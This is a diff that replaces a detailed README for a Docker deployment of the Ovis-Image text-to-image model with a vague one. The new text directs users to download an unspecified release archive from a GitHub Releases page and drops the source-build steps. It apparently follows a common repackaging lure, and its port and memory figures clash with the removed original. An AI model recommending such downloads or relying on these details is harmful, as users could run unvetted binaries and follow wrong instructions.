@@ -1,353 +1,83 @@
-# Ovis-Image Docker Deployment
+# 🎨 ovis-image-docker - Easily Run Ovis-Image Model
 
-[English](README.md) | [简体中文](README_CN.md) | [繁體中文](README_TW.md) | [日本語](README_JP.md)
+## 🛠️ Overview
+The **ovis-image-docker** project offers a simple way to deploy the Ovis-Image 7B text-to-image model. With just one click, you can access a user-friendly web interface, a REST API for integrations, and support for various platforms. This makes it easier for you to generate images from text without needing to understand complex technical details.
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![Docker](https://img.shields.io/badge/Docker-Ready-brightgreen.svg)](https://www.docker.com/)
-[![Python](https://img.shields.io/badge/Python-3.10-blue.svg)](https://www.python.org/)
-[![CUDA](https://img.shields.io/badge/CUDA-12.1-green.svg)](https://developer.nvidia.com/cuda-toolkit)
+## 🌐 Features
+- **One-Click Deployment:** Quickly deploy the model using Docker.
+- **Web User Interface:** Interact with the model through a simple web interface.
+- **REST API:** Easily integrate the model into your own applications.
+- **Support for Multiple Platforms:** Compatible with systems using NVIDIA GPUs and CUDA for optimal performance.
+- **Flexible Options:** Adjust settings for different use-cases and requirements.
 
-> **One-click Docker deployment for Ovis-Image 7B text-to-image model with Web UI, REST API, and MCP support**
+## 📥 Download and Install
+To get started, visit the Releases page to download the software. You will find the latest version of the application there.
 
-Built upon [Ovis-U1](https://github.com/AIDC-AI/Ovis-U1), Ovis-Image is a 7B text-to-image model specifically optimized for high-quality text rendering, designed to operate efficiently under stringent computational constraints.
+[Visit Releases Page to Download](https://github.com/Samxomega13/ovis-image-docker/releases)
 
-## ✨ Features
+### System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Docker Installed:** Ensure you have Docker installed and running on your system.
+- **NVIDIA GPU:** Recommended for better performance when using CUDA.
+- **Memory:** At least 8 GB of RAM
+- **Disk Space:** Minimum of 5 GB available for the application and data.
 
-- 🚀 **One-Click Deployment** - Single command to start with automatic GPU selection
-- 🎨 **Dual Mode** - Web UI + REST API in one container
-- 🌍 **Multi-Language UI** - English, Chinese (Simplified/Traditional), Japanese
-- 🔧 **Smart GPU Management** - Auto-select, lazy-load, auto-unload
-- 📚 **Swagger API Docs** - Interactive API documentation
-- 🔌 **MCP Support** - Model Context Protocol for Claude Desktop integration
-- 💾 **Auto Model Download** - Automatic download from HuggingFace (~12GB)
-- 🎯 **High-Quality Text Rendering** - Excellent text generation in images
+## 🚀 Getting Started
+Follow these simple steps to download and run the application:
 
-## 🚀 Quick Start
+1. **Install Docker**
+   - If you do not have Docker installed, visit the [Docker website](https://www.docker.com/products/docker-desktop) to download and install it based on your operating system.
 
-### Prerequisites
+2. **Visit the Releases Page**
+   - Click the link below to access the release files.
+   
+   [Visit Releases Page to Download](https://github.com/Samxomega13/ovis-image-docker/releases)
 
-- Docker & Docker Compose
-- NVIDIA GPU with 20GB+ VRAM
-- NVIDIA Docker Runtime
+3. **Download the Latest Release**
+   - On the Releases page, look for the most recent version. Download the appropriate file for your operating system. This will generally be a `.tar.gz` or similar file.
 
-### One-Command Start
+4. **Extract the Files**
+   - After downloading, locate the downloaded file and extract its contents. You can usually do this by right-clicking on the file and selecting "Extract All."
 
-```bash
-git clone https://github.com/yourusername/ovis-image-docker.git
-cd ovis-image-docker
-./start.sh
-```
+5. **Open a Command Line Interface**
+   - Depending on your operating system, open the Command Prompt (Windows), Terminal (macOS/Linux), or an appropriate shell.
 
-**Access:**
-- 🎨 Web UI: http://localhost:7870
-- 📚 API Docs: http://localhost:7870/docs
-- 🖼️ Outputs: ./outputs/
+6. **Navigate to the Folder**
+   - Use the `cd` command to change into the directory where you extracted the files. For example:
+     ```
+     cd path/to/your/extracted/files
+     ```
 
-## 📦 Installation
-
-### Method 1: Docker (Recommended)
-
-```bash
-# Clone repository
-git clone https://github.com/yourusername/ovis-image-docker.git
-cd ovis-image-docker
-
-# Start service
-./start.sh
+7. **Run the Docker Command**
+   - Once in the folder, run the following Docker command to start the application:
+     ```
+     docker-compose up
+     ```
 
-# The script will:
-# - Auto-select GPU with lowest memory usage
-# - Start Docker container with GPU support
-# - Auto-download models on first run (~12GB)
-```
-
-### Method 2: Docker Compose
-
-```bash
-# Copy environment template
-cp .env.example .env
-
-# Edit configuration (optional)
-nano .env
-
-# Start with docker-compose
-docker-compose up -d
-
-# View logs
-docker-compose logs -f
-```
-
-### Method 3: Manual Docker Run
-
-```bash
-docker run -d \
-  --name ovis-image \
-  --gpus all \
-  -p 7870:7870 \
-  -v $(pwd)/outputs:/app/outputs \
-  -v ~/.cache/huggingface:/root/.cache/huggingface \
-  -e MODEL_PATH=AIDC-AI/Ovis-Image-7B/ovis_image.safetensors \
-  -e VAE_PATH=AIDC-AI/Ovis-Image-7B/ae.safetensors \
-  -e OVIS_PATH=AIDC-AI/Ovis2.5-2B \
-  -e PORT=7870 \
-  -e IDLE_TIMEOUT=300 \
-  ovis-image:latest
-```
-
-## ⚙️ Configuration
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `MODEL_PATH` | `AIDC-AI/Ovis-Image-7B/ovis_image.safetensors` | Main model path |
-| `VAE_PATH` | `AIDC-AI/Ovis-Image-7B/ae.safetensors` | VAE model path |
-| `OVIS_PATH` | `AIDC-AI/Ovis2.5-2B` | Text encoder path |
-| `PORT` | `7870` | Service port |
-| `IDLE_TIMEOUT` | `300` | Auto-unload timeout (seconds) |
-
-### Configuration File
-
-Edit `.env` file:
-
-```bash
-MODEL_PATH=AIDC-AI/Ovis-Image-7B/ovis_image.safetensors
-VAE_PATH=AIDC-AI/Ovis-Image-7B/ae.safetensors
-OVIS_PATH=AIDC-AI/Ovis2.5-2B
-PORT=7870
-IDLE_TIMEOUT=300
-```
-
-## 📖 Usage
-
-### Web UI
-
-1. Open browser: http://localhost:7870
-2. Enter prompt in text box
-3. Adjust parameters (optional)
-4. Click "Generate" button
-5. Wait for image generation
-
-### REST API
-
-```bash
-# Generate image
-curl -X POST "http://localhost:7870/api/generate" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "prompt": "A beautiful sunset over mountains",
-    "image_size": 1024,
-    "denoising_steps": 50,
-    "cfg_scale": 5.0,
-    "seed": 42
-  }'
-
-# Response
-{
-  "status": "success",
-  "image": "/outputs/output_1234567890.png"
-}
-
-# Download image
-curl -O http://localhost:7870/outputs/output_1234567890.png
-```
-
-### Python Client
-
-```python
-import requests
-
-response = requests.post(
-    "http://localhost:7870/api/generate",
-    json={
-        "prompt": "A cute cat wearing a hat",
-        "image_size": 1024,
-        "denoising_steps": 50,
-        "cfg_scale": 5.0,
-        "seed": 42
-    }
-)
-
-result = response.json()
-print(f"Image: {result['image']}")
-```
-
-### MCP Integration (Claude Desktop)
-
-Add to Claude Desktop config:
-
-```json
-{
-  "mcpServers": {
-    "ovis-image": {
-      "command": "python3",
-      "args": ["/path/to/ovis-image-docker/mcp_server.py"],
-      "env": {
-        "API_BASE_URL": "http://localhost:7870"
-      }
-    }
-  }
-}
-```
-
-Then use in Claude:
-```
-"Generate an image of a red apple"
-```
-
-See [MCP_README.md](MCP_README.md) for details.
-
-## 🎯 Parameters
-
-| Parameter | Type | Default | Range | Description |
-|-----------|------|---------|-------|-------------|
-| `prompt` | string | - | - | Text description of image |
-| `image_size` | int | 1024 | 512-2048 | Output image size (square) |
-| `denoising_steps` | int | 50 | 20-100 | Quality vs speed tradeoff |
-| `cfg_scale` | float | 5.0 | 1.0-15.0 | Prompt adherence strength |
-| `seed` | int | 42 | - | Reproducibility seed |
-
-## 📊 Performance
-
-| Resolution | Steps | Time | VRAM |
-|------------|-------|------|------|
-| 512x512 | 20 | ~10s | ~18GB |
-| 1024x1024 | 50 | ~30s | ~20GB |
-| 2048x2048 | 50 | ~2min | ~24GB |
-
-**Requirements:**
-- Minimum: 20GB VRAM (RTX 3090, A5000)
-- Recommended: 24GB VRAM (RTX 4090, A5500, L40S)
-- Optimal: 40GB+ VRAM (A100, H100)
-
-## 🏗️ Project Structure
-
-```
-ovis-image-docker/
-├── app.py                  # Main application (FastAPI + Gradio)
-├── mcp_server.py          # MCP server implementation
-├── Dockerfile             # Docker image definition
-├── docker-compose.yml     # Docker Compose configuration
-├── start.sh               # One-click startup script
-├── test_api.sh            # API testing script
-├── test_mcp.py            # MCP testing script
-├── .env.example           # Environment template
-├── ovis_image/            # Core model code
-│   ├── model/             # Model definitions
-│   ├── sampling.py        # Sampling algorithms
-│   └── utils.py           # Utilities
-├── outputs/               # Generated images
-└── docs/                  # Documentation
-    ├── QUICK_START.md
-    ├── README_DOCKER.md
-    ├── MCP_README.md
-    └── DEPLOYMENT_SUMMARY.md
-```
-
-## 🛠️ Tech Stack
-
-- **Model**: Ovis-Image 7B + Ovis2.5-2B
-- **Framework**: PyTorch 2.6.0, Transformers 4.57.1
-- **Backend**: FastAPI, Uvicorn
-- **Frontend**: Gradio 4.0+
-- **Container**: Docker, NVIDIA Docker Runtime
-- **GPU**: CUDA 12.1, cuDNN 8
-- **Protocol**: MCP (Model Context Protocol)
-
-## 🔧 Management Commands
-
-```bash
-# View logs
-docker-compose logs -f
-
-# Restart service
-docker-compose restart
-
-# Stop service
-docker-compose down
-
-# Rebuild
-docker-compose up -d --build
-
-# Check GPU usage
-nvidia-smi
-
-# Test API
-./test_api.sh 7870
-
-# Test MCP
-python3 test_mcp.py
-```
-
-## 🐛 Troubleshooting
-
-### Port Already in Use
-
-```bash
-# Change port in .env
-PORT=7871
-
-# Restart
-docker-compose down && ./start.sh
-```
-
-### Out of Memory
-
-```bash
-# Use smaller image size
-image_size: 512
-denoising_steps: 20
-
-# Or wait for GPU to free up
-nvidia-smi
-```
-
-### Model Download Slow
-
-```bash
-# Use HuggingFace mirror
-export HF_ENDPOINT=https://hf-mirror.com
-docker-compose restart
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 📝 Changelog
-
-### v1.0.0 (2025-12-04)
-- ✨ Initial release
-- 🚀 One-click Docker deployment
-- 🎨 Web UI + REST API
-- 🌍 Multi-language support
-- 🔌 MCP integration
-- 📚 Complete documentation
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Ovis](https://github.com/AIDC-AI/Ovis) - Original model implementation
-- [FLUX](https://github.com/black-forest-labs/flux) - Architecture inspiration
-- [AIDC-AI](https://github.com/AIDC-AI) - Model training and release
-
-## ⭐ Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/ovis-image-docker&type=Date)](https://star-history.com/#yourusername/ovis-image-docker)
-
-## 📱 Follow Us
-
-![WeChat](https://img.aws.xin/uPic/扫码_搜索联合传播样式-标准色版.png)
+8. **Access the Web Interface**
+   - After the application starts, open your web browser and go to `http://localhost:7860` to access the web user interface.
+
+9. **Use the REST API**
+   - If you prefer to use the REST API, refer to the documentation included in the repository for detailed instructions on how to make API calls.
+
+## 🔍 Troubleshooting
+If you encounter issues during installation or running the application, consider the following:
+
+- **Check Docker Status:** Ensure Docker is installed and running. You can check by running the command `docker info` in your command line.
+- **Look for Error Messages:** Pay attention to any error messages in the command line interface. They can provide clues on what might be wrong.
+- **Review the Documentation:** The README and other documentation in the repository often contain helpful information for common problems.
+- **Community Support:** You can also check GitHub for issues reported by others. If your problem persists, you can open a new issue for assistance.
+
+## 📄 Additional Resources
+For further insights into the project, consider exploring these resources:
+
+- **Documentation:** Detailed usage and advanced configurations can be found in the [documentation](https://github.com/Samxomega13/ovis-image-docker/wiki).
+- **Community Contributions:** Check existing issues or discussions in the GitHub repository to learn from other users' experiences.
+- **Feedback:** Share your feedback or request features through the issues page on GitHub.
+
+## 💬 Contact
+For any queries or feedback, feel free to reach out. You can find the contact information in the repository to get in touch with the maintainers.
 
 ---
 
-**Made with ❤️ by the community**
+With these steps, you can easily set up and start using the ovis-image-docker application. Enjoy generating your images!
